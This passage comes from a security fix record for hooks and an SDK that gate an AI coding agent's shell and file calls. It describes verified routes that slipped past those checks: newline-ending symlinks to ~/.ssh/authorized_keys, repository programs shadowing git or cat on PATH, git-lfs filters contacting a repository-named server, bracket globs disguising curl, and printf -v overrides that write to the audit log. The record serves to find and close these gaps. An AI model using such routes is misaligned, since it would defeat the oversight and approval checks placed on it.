  -rf .git/acs`), an MCP tool with 4000 more arguments, a grep that exits 2
  (R407), and the control (padding with a harmless path is asked). On
  4d17c00's hook 10 fail and the control passes.

#### 2. A link target that ends in a line break was followed to another file (medium); siblings: the call's cwd, git's answers, the take hook's cwd, the persist, audit, send and rollback skills' hooks

`target=$(readlink ...)` strips every line break that ends the output, so
`notes -> 'evil\n'` was followed to `evil`, another file (none, here), while
the kernel follows it to `evil\n -> .git/acs/checkpoints/key`; git stores
such names and targets, so a clone ships them. One approved write to the
shipped name forged the key and an entry; the round-2 #4 defence was
bypassed.

- Fix (pre-tool-use hook): `resolve_path` prints an x after readlink's
  output and takes it off with readlink's own line break (an output without
  that line break is not read: a link that cannot be followed is refused).
- Sibling (found here): the call's cwd was read with `jq -r` into a command
  substitution, so a cwd `d\n` was resolved as `d`: `touch n` from it, with
  `d\n/n` a link to the key, was asked. `payload_cwd` and `call_dir` now
  read it with `jq -j` and an x, and set variables (a substitution of the
  function's output would strip it again). `recorded_commit` reads the
  same cwd: a restore run in a repository `r\n` beside the project's plain
  directory `r` was a rollback of the project's commit; it is a mutate.
- Sibling (found here): git's answers. `git_dir_at` (which replaces
  `git_dir_of` and the inline `rev-parse --absolute-git-dir` calls),
  `git_line` (`--git-common-dir`) and the hooks path of `git_runs_configured`
  read git's line with an x. A `core.hooksPath` ending in a line break named
  another directory than the one git runs `post-index-change` from.
- Sibling (found here): the take hook compared the stripped cwd's and the
  project's toplevels, so a `git stash create` run in a repository `r\n`
  wrote a marker for the project; it reads the cwd, both toplevels and the
  git directory exactly, and writes none.
- Sibling (reported unverified; confirmed): the persist skill's hook read
  `R_TO=$(readlink ...)`, `$(pwd -P)` and `$(cd -P ... && pwd -P)` the same
  way, and returned the resolved path through a substitution: `notes.md ->
  'a\n'`, `'a\n' -> ~/.ssh/authorized_keys` passed. Each is read with an x
  (POSIX sh: `${v%x}`, then the line break pwd or readlink prints).
- Sibling (found here): the persist, audit and send skills' file-tool hooks
  read `file_path` with `jq -r`, so a `file_path` ending in a line break was
  checked as the name without it: `k\n`, a link to
  `~/.ssh/authorized_keys`, `.claude/audit/records.jsonl` or `~/.curlrc`,
  passed. They read it with `jq -j` and an x; the audit skill's Bash hook
  reads its cwd so, and the rollback skill's hook, which removed every line
  break from the cwd (another directory), reads it exactly.
- Checked, not changed: the audit and send hooks' `readlink -f` gives the
  canonical path of the file reached; stripping a final line break from it
  can only make a pattern match (each tests the end of a name), never hide
  one. A tool name or a command read with `jq -r` names no file.
- Tests: `test_records_guard.py` `TestPathsReadExactly` (the link chain to
  the key and to an entry: `touch nl`, `cat ... > nl; cat ... > nl2`, `cp
  a.txt ./nl2`; Write and an MCP write; a cwd `d\n`; a restore in `r\n`; a
  take in `r\n`; the control, a link to a regular file `plain\n` beside a
  link `plain` to the key, is asked) and `test_skill_hooks.py`
  `TestPathsReadExactly` (persist: a link to `a\n`, a `file_path` `k\n`,
  the control; audit and send: a `file_path` `x\n`; rollback: a cwd `r\n`;
  each under sh and bash). On 4d17c00's hooks and skills all 21 fail (the
  two controls too: the old code refused them, reading `plain` and `a`).

#### 3. A command the hook lets pass ran whatever program PATH found for its name (medium)

`classify_bash` compared the first word's text with `READ_ONLY` and the
`git stash` forms; bash runs the first executable file of that name on its
`PATH`. With a relative entry (`PATH=node_modules/.bin:$PATH`, a common
setup), an empty one (`$EXTRA:$PATH`, a leading colon: the working
directory) or an absolute one in the project (an activated virtual
environment, direnv's `PATH_add`), a repository file named `git`, `cat` or
`ls` ran as `observe`, `checkpoint` or a recorded `rollback`, with no
checkpoint and no approval. `hook_path` guarded the hook's own programs
only.

- Fix (pre-tool-use hook): the hook saves the `PATH` Claude Code gives it
  (the agent's commands get the same environment) before `hook_path`
  narrows its own, and `command_may_be_content` walks it as bash does:
  the first entry holding an executable file of the name decides; an empty
  or relative entry (read from the call's directory) that holds one, a
  file that lies in the project (its entry's directory and each link
  followed exactly; not where the project is the home directory, or holds
  it, as `hook_path` reads the project), or no file anywhere (or anything
  unreadable) makes the call `mutate`, before any narrower class. A name
  found first in a system directory is unchanged.
- Fix (SDK mapper, which must agree): `command_may_be_content(name, cwd,
  search_path, project_dir)`, the same walk; `ToolCapabilityMapper` gains
  `command_path` (None: this process's `PATH`) and `project_dir` (None:
  this process's working directory) and a replaceable
  `command_may_be_content`; a read-only command and the single-command
  `git stash` forms take the worst case where it says yes (a lookup that
  fails is a yes). `wrap_options()` sets both from the options it wraps
  (`env["PATH"]`, `cwd`: the CLI runs its commands with this process's
  environment and `options.env` over it).
- Not seen (documented in SECURITY.md §5.1, §5.5 and hooks/README.md): the
  entries the Bash tool adds to `PATH` from the user's shell startup files
  (its shell snapshot) reach no hook.
- Tests: `test_command_programs.py`: hook (started as Claude Code starts
  it, `/bin/sh -c`) and mapper agree on 10 gated cases (relative,
  `./`-prefixed and absolute in-project entries for `git status`, `git log
  -1`, `cat`, `git stash create`, `git stash list`; a leading and a middle
  empty entry for `ls`), a link outside the project into it, a name found
  nowhere (a `PATH` holding only the hook's programs), 7 controls (the
  system's programs; a relative or in-project entry without that name; an
  empty entry after the system's), the home-directory rule, and
  `wrap_options()` setting and clearing both attributes. On 4d17c00's hook,
  mapper and adapter 14 fail and the 7 controls pass.

#### 4. The hooks' own git calls had no time bound (medium); siblings: the log hook's git, the settings files' reads, the SDK's settings read

git reads the files a repository's configuration includes (`include.path`),
and opening a FIFO, or reading a terminal such as `/dev/ptmx`, waits for a
writer: every gated call then got no verdict within hooks.json's 30
seconds, and a Claude Code without `onFailure: "block"` runs it. The
verifier also delivered it with a plain clone: `.claude` shipped as a git
directory (`HEAD`, `objects/`, `refs/`) whose `config` includes `/dev/ptmx`
stalled the marker's check (round 2 #2's refusal became no verdict).

- Fix (the block the three hooks share, kept equal by a test): `bounded`
  runs a program (by `exec`, so the process killed is the program) with
  no input, and a watchdog that kills it after 5 seconds; status 124 when
  stopped (or when `sleep` cannot time it). `hgit` (pre and take hooks,
  kept equal by a test) runs git through it, as do the hooks path lookup
  and the log hook's anchor lookup.
- Fix (callers): a git that did not answer counts as one that cannot say,
  never as "no repository": `git_dir_at` tells found (0), no repository
  (git's 128) and cannot say (2); `git_dir_is_content`,
  `git_runs_configured` and `git_read_gated` answer yes (the call is
  gated); the records guard blocks with R407 when it cannot name the
  project's git directory (its `acs/` cannot be compared), the marker check
  with F501 when it cannot name the marker's; `recorded_commit` restores
  nothing (a mutate); the take hook writes no marker; the log hook writes
  its line without the anchor and says why (exit 1). Every chain of
  stalled reads ends in a decision within about 15 seconds (two stalls in
  the classification, one in the restore lookup, then a final one), well
  inside 30; measured: 5 s for a Write, 10 s for `git status`.
- Sibling (found here): `jq` read the project's settings files with no
  bound: a FIFO, or a link to `/dev/ptmx`, at `.claude/settings.json` held
  each hook. A settings file that is not a regular file is now unreadable
  (R407 at once), and the read is bounded too. The SDK adapter's
  `refused_project_env` opened it with a blocking `open()`: it now opens
  it non-blocking and refuses one that is not a regular file (fstat).
- Checked, not changed: the SDK mapper bounds every git call (`timeout=10`,
  a timeout is a yes), as the verifier found. The rollback skill's hook
  runs git without a bound (POSIX sh, no `timeout` on macOS): the
  pre-tool-use hook, which sees every call, decides the same restores in
  time (a restore it cannot check is a gated mutate), so a stall there is
  no pass; SECURITY.md §5.5 says so. The marker, the key and an entry are
  read only once a test shows a regular file.
- Tests: `test_hook_git_bound.py`: with a FIFO included, a Write, `rm -rf
  src`, `git status` and `git stash create` are blocked with R407 in under
  20 s, the marker kept; the control without the include is asked in under
  5 s; the shipped `.claude` git directory including `/dev/ptmx` gives
  F501 in time; the take hook writes no marker and the log hook logs the
  call and says why, in time; a FIFO and a `/dev/ptmx` link at
  `.claude/settings.json` are unreadable at once in each of the three hooks
  (6), and the SDK's `refused_project_env` reads both as unreadable (in a
  process of its own, under 20 s); and every git command after the shared
  block goes through `bounded`. On 4d17c00's hooks 13 fail (each held past
  the 35 seconds the check gave it, with no verdict) and the control
  passes; on its SDK both settings reads fail (held past 20 s).

#### Documentation

SECURITY.md §5.1 (the program rule, exact link following, the bounded
reads) and §5.5 (`onFailure` and the bound; a user's `PATH`); the hooks'
README; the pre-tool-use hook's header; CHANGELOG [Unreleased] Upgrading
(the plugin's round-5 entry and the SDK classifier entry). The Standard's
text was not changed: §5.18.3 already classifies by effect, with the
worst case where the layer cannot tell, and §5.18.8 already requires a
check that cannot complete to refuse.

#### Checks after batch 1

- Python: `pytest tests/` in bounded groups (each under `timeout 120` and a
  4 GB address-space limit: each file, `tests/test_skill_hooks.py` in
  chunks of 150 node ids, and `tests/test_redaction.py` in chunks of 50,
  its slow chunk again in chunks of 10): 7598 passed, 18 skipped, of 7616
  collected (7546 before, plus the 70 new). ruff check and format with CI's
  lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; `sync_skill_schemas.py --check` and the five generators'
  `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed; not rebuilt.
- TypeScript: the package's build, check and test (2056 passed); the
  binding's check and test (263 passed, 2 skipped). No TypeScript source
  changed: neither classifies shell commands nor runs a hook.
- Old code: the new tests against 4d17c00's `hooks/`, `skills/`,
  `grounded_agency/` (copied in place, or, for the stalls, run from a copy
  of the old hooks with a 35-second cut-off): of the 69 run, 60 fail and
  the 9 controls pass (#1: 10 of 11 fail; #2: 21 of 21; #3: 14 of 21; #4:
  15 of 16); #4's check that every git goes through `bounded` was not run
  there (the old hooks have no such function).
- Probes, each under `timeout 120` and a 4 GB address-space limit: each
  reported route rerun on the fixed hooks (padding after a records path,
  a shipped `notes -> 'evil\n'`, a cwd `d\n`, `node_modules/.bin`, a
  leading colon and an in-project entry on `PATH`, a FIFO include for a
  Write, `rm -rf src`, `git status` and `git stash create`, the log hook);
  each now refuses or gates in time. No CLI or nested agent was started;
  the git and jq processes the old hooks left waiting on FIFOs were
  killed; the scratch repositories were removed.

### Batch 2: four reported defects

Four defects, each reproduced by an independent verifier on 4d17c00, and
reproduced again here on cd2a2d0 before any change (probes under `timeout
120` and a 4 GB address-space limit, in scratch directories since
removed): the log hook wrote a `Skill` call's skill name `ghp_...`
verbatim into a signed line (the chain verified with the token in it);
`ToolCapabilityMapper` gave `pip list` and `pip show pip` `observe` (the
plugin hook gated both); with git-lfs's filter in a scratch `HOME`'s
configuration and a repository whose `.lfsconfig` names a local listener,
`git reset --hard origin/data` was `mutate` alone and POSTed the object id
to `/lfs/objects/batch` twice, and a restore of a recorded checkpoint
holding a pointer the store lacks passed the plugin's hook with no marker
and no approval; and `ls in.txt; <in.txt` was `observe`. None was fixed by
an earlier batch: round 4 batch 5 #1 redacted tool names in the binding
and the Python adapter, not in the plugin's log hook; round 1 #14 kept
`pip list` and `pip show` on the list ("pip reads no project-level
configuration", corrected there); round 3's git configuration rule read
the repository's own scopes only; and `_simple_commands` dropped every
command with no words. Each fix has tests that fail on the code before it
(below).

#### 1. The log hook wrote the model-chosen skill name verbatim into every action record (low); siblings: the tool's name in the record and in the pre-tool-use hook's diagnostics

`posttooluse_log_tool.sh` read `.tool_input.skill` and wrote it into
`details.skill` unchecked, though its own header says the input is never
written because it can hold a credential, and the line is HMAC-signed, so
a secret there cannot be taken out without breaking the chain (§6.7: no
secret in an audit record). The verifier showed that in Claude Code the
name is a registered skill's but for the feature-gated MCP skill address
(`<server>:<scheme>:...`), any text after a connected server's name.

- Fix: `plain_name` (one block in the log hook and the pre-tool-use hook,
  kept equal by a test) shows a name as written only when it is plain (1
  to 128 ASCII letters, digits, `.`, `_`, `:` or `-`, checked in the C
  locale) and the plugin's secret scan (`secret_in`, now also copied into
  the log hook, run without pipefail) answers no (status 1); otherwise,
  and when the scan cannot answer (no grep: 127), `[REDACTED]`, the whole
  name (§6.7 forbids the digest of a secret alone, which a name may be).
  Claude Code's own tools' names skip the scan (it cost 40 ms a call).
- Sibling (found here): the record's `tool` and `intent` (an MCP server
  names its tools) go through `plain_name` too; and the pre-tool-use
  hook's diagnostics (§9.8, §6.7) named the tool verbatim (the F502
  reason for an unbound tool, the records guard's F504s): they name
  `shown_tool`, computed once after the ungated tools have passed.
- Checked, not changed: `call_id` and `action_id` (the API's
  `tool_use_id`), the take hook's marker (a validated commit id), the
  stop hook (writes no name); the Python adapter and the binding redact
  tool names already (round 4 batch 5 #1; the adapter records no skill
  name).
- Tests: `test_hooks_unit.py` `TestNamesHoldNoSecret`: the two blocks and
  the scan copy equal; a skill name holding a GitHub token, an AWS key id,
  an Anthropic key, an MCP skill address with a token, `x_<token>`, a
  `token:` pair, and names outside the grammar (129 characters, a blank,
  a slash, an `@`, `prüfen`) are `[REDACTED]`, the log holds none and the
  chain verifies; an empty name stays `unknown`; an MCP tool name with a
  token is `[REDACTED]` in `tool` and `intent`; plain names kept (control);
  a scan with no grep redacts (Claude Code's tools need no scan); the
  grammar is ASCII in a UTF-8 locale; the pre-tool-use hook's F502 reason
  for `mcp__srv__<token>` holds no token, and a plain tool is named
  (control). `test_non_ascii_skill_name_verifies` and
  `test_line_separators_inside_a_name_verify` keep their purpose (the
  verifier recomputes the HMAC of non-ASCII text and of U+2028 inside a
  value) with the text in the call id; the skill name is now
  `[REDACTED]` there. On cd2a2d0's hooks 21 fail and the 6 controls pass.
- Cost: a gated MCP call's pre-tool-use run 51 to 55 ms, a log run 171 to
  192 ms (a built-in tool; a `Skill` call adds one scan).

#### 2. `pip list` and `pip show` were `observe`, but pip runs code the repository's virtual environment names (medium)

pip reads the site configuration `sys.prefix/pip.conf` (even with
`--isolated`), which an activated in-project `.venv` keeps from the
repository (`python -m venv .venv` does not replace it), and re-runs itself
under the program its `[global] python =` names; the interpreter it starts
runs every `.pth` file of its site-packages (a shipped one, or the one an
editable install of the project writes). The mapper's allow-list held
both, so the repository's program ran with no checkpoint, no approval and
no destination check; the plugin hook never listed pip.

- Fix: both entries are off `_READ_ONLY_COMMANDS` (the worst case, as
  `npm list` in round 1), with `_SUBCOMMAND_OPTIONS` (now empty) and the
  `pip` branch of `_writes` and `pip` in `_ARGUMENT_WRITERS` (dead code).
  The round-1 note in this record is corrected; the SDK guide, SECURITY.md
  §5.5 and CHANGELOG say so.
- Siblings checked: no other read-only entry is a program an interpreter
  of the environment runs (`which` and `locate` are shell or C programs
  that read no project configuration); `python -m pip` was already the
  worst case (an interpreter); `pip3` was never listed.
- Tests: `test_bash_classification.py`: `pip list` (plain, `--format`,
  `--isolated`, `--disable-pip-version-check --isolated -l`) and `pip show`
  (`-f`, `--isolated`) moved to the worst case, `pip list` and `pip show
  pip` refused F504 under a policy, and the premise
  `test_pip_runs_the_program_a_shipped_venv_configuration_names` (a venv
  made over a shipped `.venv/pip.conf`; `pip list`, `pip show pip`, `pip
  list --isolated` run `tools/py`); `test_hook_lists_match_mapper.py`
  `test_pip_is_gated_in_both` (the hook and the mapper gate `pip list`,
  `pip show pip`, `pip list --isolated`, `"pip" list`, and `pip3 list`, a
  control). On cd2a2d0's mapper 15 fail and the control passes.

#### 3. A git change that writes the tree, and a recorded restore, ran git-lfs's smudge filter from the user's configuration, which asks the LFS server the repository names (medium)

`git lfs install` writes `filter.lfs.smudge` and `process` to the user's
configuration; the repository's attributes decide that the filter runs
and its `.lfsconfig` where git-lfs connects; for each pointer whose object
the store lacks, a write of the work tree POSTs the object id (which the
agent can choose by writing a pointer before `git stash create`) to that
server. The mapper read the local and worktree scopes only, so `git reset
--hard` was `mutate` (no `send`: no destination check), and a restore of a
recorded checkpoint was `rollback` in the mapper and passed the plugin's
hook with no marker and no approval. Reads run no smudge (the verifier
measured none).

- Fix (mapper): `git_filter_may_run(cwd)` (a replaceable
  `ToolCapabilityMapper.git_filter_may_run`; a lookup that fails is a yes)
  asks `git config -z --get-regexp '^filter\..+\.(smudge|process)$'` in
  every scope; any value but the two `git lfs install --skip-smudge`
  writes, as written (`_SKIPPING_SMUDGE`; probed: they ask no server), is
  a yes, as is no git, a git error or a timeout; no repository is a no. A
  local change that writes the tree (`git reset`, `git checkout --`, every
  `git stash` form: `_writes_tree`) and a recorded restore take the worst
  case there; `git clean`, `git branch -d`, the reads and `git stash
  create` keep their classes.
- Fix (hook): `git_filter_runs` asks the same (the NUL-separated listing
  turned into lines, so a value with a line break or a tab is no skip
  command), and a restore is `rollback` only where it says no; the hook's
  other git changes are a gated `mutate` already. A test keeps the
  pattern and the two commands the mapper's.
- Checked: `git stash apply <commit>` runs `post-index-change` alone of
  git's hooks (probed with every hook present), which the restore check
  reads; git-lfs's `post-checkout` gates a change already. The user's
  global merge, diff and textconv drivers stay ungated (they run the
  user's programs, which reach no host a repository names).
- Test isolation (found here): this machine's system configuration holds
  git-lfs's `--skip` filter, and a GitHub runner's the plain one; with the
  plain one, 51 existing tests of restores and tree-writing changes
  failed. `tests/conftest.py` now gives every test an empty user and no
  system configuration (`GIT_CONFIG_NOSYSTEM`, an empty
  `GIT_CONFIG_GLOBAL`), and `test_git_config_programs.py`'s `home`
  fixture removes `GIT_CONFIG_GLOBAL` so its `HOME` is the user's; with a
  plain git-lfs system configuration in the outer environment the git
  test files then pass (1273).
- Tests: `test_git_config_programs.py` `TestFiltersInAnyScope`: the
  premise with git-lfs and a local LFS server (classified before the
  write, with no git-lfs hook yet: `git reset --hard origin/data` asks
  `POST /lfs/objects/batch` with the oid; with `--skip-smudge`, nothing);
  eight tree-writing changes the worst case; a recorded restore the worst
  case for git-lfs's smudge, its process, another smudge, an empty one,
  and a skip smudge beside another process; the system and command scopes
  count; the controls (skip-smudge restore `rollback`, `git reset`
  `mutate`; with git-lfs, `git clean`, `git branch -d`, reads and `git
  stash create` unchanged); no repository a no, a failed lookup a yes;
  F504 under a destination policy (and no decision without the filter);
  the hook gates the recorded restore F501 as the mapper does (git-lfs,
  another smudge; skip-smudge passes, a control); a value with a line
  break is no skip command; one pattern and one exception in both. On
  cd2a2d0's mapper and hook 22 fail and the 2 controls pass (the pattern
  test was added after that run).

#### 4. A simple command of a redirection alone was dropped, but zsh runs READNULLCMD for it (medium)

`_simple_commands` returned only the commands with words, so `ls; <f`,
`ls | <f` and `cat f && <f` were `observe`. bash runs nothing for `<f`;
zsh, the Bash tool's shell where it is the user's (macOS's default), runs
`$READNULLCMD <f`, a pager (less on macOS, Debian's `pager`), which a
`LESSOPEN` or lesskey `|-` preprocessor makes run code, and `$NULLCMD`
for an output redirection.

- Fix: the reading keeps the indices of the simple commands that hold a
  redirection; a line where one of them has no words takes the worst case.
  A command with neither (`ls;`, `ls &`) still runs nothing.
- The plugin's hook gated these already (it refuses `<`, `;`, `|` and `&`
  anywhere).
- Siblings checked (zsh with its default options): `<(...)`, `=(...)`,
  glob qualifiers and `<1-5>` need parentheses or angle brackets the
  reading refuses; `&!`, `&|` and `|&` read as an unlisted word or an
  operator it refuses; `=cmd` expands to a command's absolute path, never
  an option. Not seen, as before (now said in SECURITY.md §5.1 and the
  hooks' README): the options, aliases and functions the user's startup
  files set; with `EXTENDED_GLOB`, `^`, `#` and `~` are pattern
  characters too (`find . -delete#`, `uniq a#`), read as text.
- Tests: `test_bash_redirections_and_braces.py`
  `TestRedirectionWithNoCommand` (bash runs nothing for `<in.txt`; zsh
  runs `$READNULLCMD`, skipped without zsh; eleven lines the worst case:
  after or before an allow-listed command, behind `|`, `&&`, `||`, `&`,
  and the output forms `>/dev/null`, `2>/dev/null`, `>&2`), five controls
  in `CONTROLS` (`ls;`, `ls &`, `<in.txt cat`, `>/dev/null ls`, `cat
  in.txt < in.txt`), the adapter's F501 and F504 and the hook's F501 for
  the first. On cd2a2d0's mapper 11 fail (`ls; 2>/dev/null` passes: its
  `2` was already read as a command) and the controls pass.

#### Documentation

SECURITY.md §5.1 (a restore and the user's filters; the tool named as
the log hook records it; the user's shell options), §5.2 (the names in
the log line) and §5.5 (`pip`, a redirection with no command, a change
that writes the tree and a restore where a smudge filter is configured);
the hooks' README (the record's fields, the restore, the shell options);
the log hook's and the pre-tool-use hook's headers; the SDK guide
(`docs/integrations/claude_agent_sdk.md`: the classifier's text and
table); CHANGELOG [Unreleased] Upgrading (the SDK classifier entry and
the plugin's round-5 entry). The Standard's text was not changed:
§5.18.3 already classifies by effect, with the worst case where the layer
cannot tell, and §6.7 already forbids a secret in an audit record or a
diagnostic.

#### Checks after batch 2

- Python: `pytest tests/` file by file, each run under `timeout 120` and a
  4 GB address-space limit (`tests/test_redaction.py` and
  `tests/test_skill_hooks.py` in chunks of 100 node ids, a chunk that ran
  out of time again in chunks of 20): 7682 passed, 19 skipped, of 7701
  collected (7616 before, plus the 85 new; the new skip is the zsh premise,
  no zsh here). The git test files also pass with a plain git-lfs filter
  in the outer environment's system configuration (1273). ruff check and
  format with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; `sync_skill_schemas.py --check` and the five generators'
  `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed; not rebuilt.
- TypeScript: the package's build and test (2056 passed); the binding's
  check and test (263 passed, 2 skipped). No TypeScript source changed:
  neither classifies shell commands nor runs a hook, and the binding and
  the adapter redact tool names already.
- Old code: the new tests against cd2a2d0's `hooks/` and
  `grounded_agency/capabilities/mapper.py` (copied in place, then
  restored): #1 21 of 27 fail (6 controls pass), #2 15 of 16 (`pip3
  list`, a control, passes), #3 22 of 24 (2 controls pass; the
  one-pattern test, added after, was not run there), #4 11 of 12 worst-case
  and adapter tests fail (`ls; 2>/dev/null` passes), and its controls and
  hook tests pass.
- Probes, each under `timeout 120` and a 4 GB address-space limit: the
  log hook with a skill name holding a GitHub token, an AWS key id, an
  Anthropic key and an MCP skill address, and an MCP tool name with a
  token (each `[REDACTED]`, no token in the log, the chain verifies); `pip
  list` and `pip show pip` (the worst case); with git-lfs's filter in a
  scratch `HOME` and a local LFS listener, `git reset --hard origin/data`
  (the worst case; run, it POSTed the object id to the listener) and a
  recorded restore of a pointer the store lacks (the hook: F501, was
  allowed in `default` and `bypassPermissions`; with `--skip-smudge`
  nothing was asked of the server); `ls in.txt; <in.txt` and its forms
  (the worst case). No CLI or nested agent was started; the listener was
  stopped; the scratch repositories were removed.

### Batch 3: four reported defects

Four defects, each reproduced by an independent verifier on 4d17c00, and
reproduced again here on a6c4136 before any change (probes under `timeout
120` and a 4 GB address-space limit, in scratch directories since
removed): with the host process in a directory that is no repository, the
SDK's checkpoint recorder took a checkpoint from a `git stash create` run in
a shipped `vendor/evil.git` (`core.bare=false`, `core.worktree` another
tree) that the PreToolUse classification made `mutate` and `send`, and with
`core.worktree` the project the plugin's take hook wrote a marker naming a
commit of that directory's object store; the permission callback allowed,
on one decision with no role, an `execute` or `mutate` binding registered
again with `min_approvers` 3, a `role` or both after the hook asked or while
the host decided, and a 10-minute-late decision on an expiry added while
the host decided; the send hook let `/usr/bin/cur[[:alpha:]]`, `cur[]l]`,
`w[[:alpha:]]et` and `~/.cur[[:lower:]]rc` pass, the audit hook appended
through `.cl[[:lower:]]ude/...` and `.cl[a-z]ude/...`, and the rollback hook
let `git st[[:alpha:]]sh apply <unrecorded>` through; and the audit hook let
`printf -v 'BASH_CMDS[cat]' %s /usr/bin/tee; ... | cat -a
.claude/audit/records.jsonl` and `printf -v PATH ...` pass. None was fixed
by an earlier batch: round 2 #3 applied the shipped-git-directory rule in
the PreToolUse checks and `record_after_call`, not in the recorder or the
take hook; round 1 batch 3 #2's approval rules lived in PreToolUse alone,
and round 1 #36 was the binding's request rounds ("Python sibling: none",
corrected below); round 4 batch 3 #4 read extglob openers, and the
converters' bracket handling dates from round 2; round 3 #5's `printf -v`
rule is the SDK mapper's and the send hook's. Each fix has tests that fail
on the code before it (below).

#### 1. The checkpoint recorder classified `git stash create` without the call's cwd (medium); siblings: the take hook's git directory and git program

`record_checkpoint` called `classify.map_tool(tool_name, tool_input)`, so
`git_dir_may_be_content` and `command_may_be_content` ran in the adapter
process's directory: a stash the PreToolUse hook classified the worst case
(no checkpoint, §5.18.6) took one whose commit is the shipped repository's
work tree, which a later gated call held and `is_checkpoint_commit`
accepted for a restore. The plugin's take hook compared work trees alone.

- Fix (SDK): the recorder classifies in the call's directory, its input's
  `cwd`, else the one the PreToolUse hook kept (`create_checkpoint_recorder`
  takes `call_dir`, a function of the call id; `wrap_options()` passes
  `GroundedAgentAdapter._kept_call_dir`, which reads `_HookCheck.cwd`
  without dropping it), and takes none where the input names another
  directory than the hook's (where it ran cannot be told). `_tree_is_head`
  reads the same directory.
- Fix (take hook): it writes a marker only where the pre-tool-use hook
  classified the call `checkpoint` where it ran: `command_may_be_content
  git` and `git_dir_is_content` (the same functions, now one block,
  `# BEGIN call-place`, in both hooks, kept equal by a test, with
  `agent_path` saved before `hook_path` narrows the hook's own `PATH`), and
  only for a call run with the project's git directory as well as its work
  tree (sibling found here: an agent-made `sub/.git` with `core.worktree`
  the project stashed into `sub/.git`'s store; its git directory is one git
  makes, so only the comparison refuses it).
- Sibling (found here): a repository's `git` on `PATH`
  (`node_modules/.bin`) printed a commit id of its choosing; the
  pre-tool-use hook and the mapper gate it as `mutate`, and now neither the
  take hook nor the recorder takes a checkpoint from it.
- Checked, not changed: the evidence collector classifies without the cwd
  (it labels evidence; no safety decision reads it); the adapter's other
  cwd-less `map_tool` calls classify MCP tools, whose mapping does not
  depend on a directory.
- Tests: `test_checkpoint_where_it_ran.py` (the premise: the stash is a
  commit outside the project's store, classified `mutate`/`send`; the
  recorder takes none for a commit or an empty output there; the take hook
  writes no marker or entry where `core.worktree` is the project; through
  `wrap_options()`, no checkpoint with the hook's cwd only, with the input's
  cwd, or with another cwd than the hook's; a repository `git` on `PATH`;
  a nested `sub/.git` with the project's work tree; controls: the project,
  a subdirectory, the system's git) and `test_hook_lists_match_mapper.py`
  `test_both_checkpoint_hooks_read_where_a_call_ran_alike`. On a6c4136's
  recorder, adapter and hooks 8 of 11 fail; the premise and the 2 controls
  pass.

#### 2. The permission callback decided on the approval policy it read before the host's prompt (medium); siblings: a checkpoint or approval a changed binding now needs, a composite reloaded

PreToolUse refused `min_approvers > 1` and a `role` and started the
expiry's clock; the callback never applied the first two and read
`expires` from the mapping it took before awaiting the host, so a binding
registered again after the ask, or during the prompt, ran on one decision.
§5.18.7 counts a decision against the binding's approval policy.

- Fix: the hook keeps the mapping it checked a call under
  (`_HookCheck.mapping`); the callback, before it asks the host, checks a
  call whose mapping differs from it again (`_changed_binding_refusal`: the
  §5.18.10 checks under the current mapping, F504; a prerequisite or a
  checkpoint the call does not hold, F501; F502 where it requires approval:
  the decision would be asked under another binding) and refuses a policy
  it cannot meet (`_approval_policy_refusal`, shared with PreToolUse: more
  than one approver, a role) before anyone is asked; after the host allows,
  it classifies the call again, applies the same to a mapping that changed
  while the host decided, and takes `expires` from the policy then in force,
  measured from the ask. `_changed_input_refusal` and the new check share
  `_recheck_refusal`. A hold the final mapping does not need is released.
- Siblings (found here): a tool registered again as `mutate` while the host
  decided ran holding no checkpoint (refused: F501 or F502); a composite
  whose invoked binding was registered again with two approvers during the
  prompt (refused: F502).
- The round-1 #36 note "Python sibling: none" is corrected by this entry:
  the stale policy lived within one call.
- The binding (TypeScript) keeps its round-1 rule: a request asked under a
  policy weaker than the call's opens a new round; no call fixture changes
  a binding during a call, so the fixtures agree.
- The Standard's text was not changed: §5.18.7 already counts validity
  against the binding's `approval`, and says a host's prompt cannot meet a
  `min_approvers` above 1 nor a `role`.
- Tests: `test_approval_policy_at_decision.py`: after the ask (3 policies ×
  `execute`/`mutate`: F502, no one asked, the checkpoint kept, a new call
  refused at the hook), during the prompt (the same 6, an expiry added and
  answered 10 minutes later, a binding that now needs a checkpoint, a
  composite reloaded), and 4 controls (an unchanged binding with an expiry
  runs, as does the same binding registered again and one that changes to
  a binding needing no approval). On a6c4136's adapter 15 fail and the 4
  controls pass.

#### 3. POSIX bracket expressions defeated the send, audit and rollback hooks' glob reading (medium)

send's `glob_regex` ended a class at its first `]` (`cur[[:alpha:]]` became
`^cur.\]$`, `cur[]l]` `^cur.l\]$`); audit's `glob_part` and rollback's
`may_be` kept a set's text (`:lower:`, `a-z`, `!x`) as letters the name
must hold, so every bracket expression but a one-letter set was missed.

- Fix: one reader in `hooks/shell_words.jq` (copied into the three skills
  as before): `glob_text` marks a word's unquoted `*`, `?`, `[`, `]` as
  `\u0001` to `\u0004` (the word reader's new field `g`; control characters
  typed in a word read as U+FFFD), and `glob_marks` reads each bracket
  expression as bash does, in time linear in the word (a precomputed "next
  stop" array and one pass): `[`, then `!` or `^` and a character, or a
  character other than `!` and `^`, then characters, up to the `]` that
  closes it, is one character where no character before that `]` is a `[`
  followed by `:`, `=` or `.` and the first is no `]`. Where a `[` that a
  `]` follows opens any other set, the run from it to the last `]` matches
  any run: more than bash, never less. The send hook, whose runs lose their
  quotes before, also reads a `]` after a set as part of it (`cur[l"]"]`).
  `glob_min` and `marks_regex` give the length bound and the regex; no
  regex is built from a glob that matches more characters than the name.
- Checked: a fuzz of 3000 unquoted and 2000 quoted patterns per seed over
  `curlwgets[]!^:=.a-*?`, 4 seeds, against bash's own `case` matching
  (names `curl`, `wget`, `stash`, `x]`, `c]l`, `c!l`, `c:l`, ...): no name
  bash matched that the reading did not, for both readings. 16 KB words of
  `[`, `[[:`, `]` and `[!]` are read in about a second each (the old
  `\[[^\]]*\]` took 0.9 s, a backtracking regex for the new rule 4.3 s).
  The SDK mapper reads no glob as a name (a glob word is its worst case);
  the plugin's records guard does not read patterns (documented).
- Tests: `test_skill_hooks.py` `TestGlobMarks` (soundness against bash for
  19 patterns and 8 names, both readings; a simple set stays one character;
  16 KB in under 20 s) and `TestBracketExpressions` (send: 15 refusals and 5
  controls such as `grep -E '[a-z]+'`, `ls file[12].txt`; audit: 8 and 3;
